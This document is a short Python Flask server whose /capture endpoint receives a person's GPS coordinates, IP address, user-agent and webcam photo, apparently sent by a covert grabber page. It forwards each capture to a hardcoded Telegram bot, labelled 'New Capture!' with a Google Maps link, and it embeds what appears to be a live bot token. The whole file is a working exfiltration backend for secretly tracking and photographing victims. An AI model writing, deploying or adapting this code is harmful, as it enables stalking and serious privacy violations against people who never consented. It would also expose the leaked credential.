from flask import Flask, request, jsonify
import requests
import base64
import json
import os
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "8776319908:AAE20JFKWYx7op_YrlvrWcT2MUisGMlnffc"
CHAT_ID = "6094939769"

API = f"https://api.telegram.org/bot{BOT_TOKEN}"

@app.route('/')
def home():
    return "✅ Server is running!"

@app.route('/capture', methods=['POST'])
def capture():
    try:
        d = request.json
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip: ip = ip.split(',')[0]
        
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        lat = d.get('lat')
        lon = d.get('lon')
        
        msg = f"<b>🎯 New Capture!</b>\n"
        msg += f"📍 Location: {lat}, {lon}\n"
        msg += f"🌐 IP: {ip}\n"
        msg += f"⏰ Time: {ts}\n"
        
        if lat and lon and str(lat) != 'None' and str(lon) != 'None':
            msg += f"🗺️ Maps: https://www.google.com/maps?q={lat},{lon}\n"
        
        msg += f"📱 User-Agent: {str(d.get('userAgent', ''))[:80]}"
        
        # Photo send karein
        if d.get('photo') and len(str(d.get('photo', ''))) > 100:
            try:
                b64 = d['photo']
                if ',' in b64: b64 = b64.split(',')[1]
                img = base64.b64decode(b64)
                name = f"/tmp/photo_{datetime.now().timestamp()}.jpg"
                with open(name, 'wb') as f: f.write(img)
                with open(name, 'rb') as f:
                    requests.post(
                        f"{API}/sendPhoto",
                        data={"chat_id": CHAT_ID, "caption": msg, "parse_mode": "HTML"},
                        files={"photo": f},
                        timeout=30
                    )
            except Exception as e:
                requests.post(
                    f"{API}/sendMessage",
                    json={"chat_id": CHAT_ID, "text": msg + f"\n(Photo error: {str(e)[:30]})", "parse_mode": "HTML"},
                    timeout=10
                )
        else:
            requests.post(
                f"{API}/sendMessage",
                json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"},
                timeout=10
            )
        
        print(f"[OK] Captured: {lat}, {lon}")
        return jsonify({"success": True}), 200
        
    except Exception as e:
        print(f"[ERROR] {e}")
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == '__main__':
    print("🚀 Server starting...")
    app.run(host='0.0.0.0', port=5000)
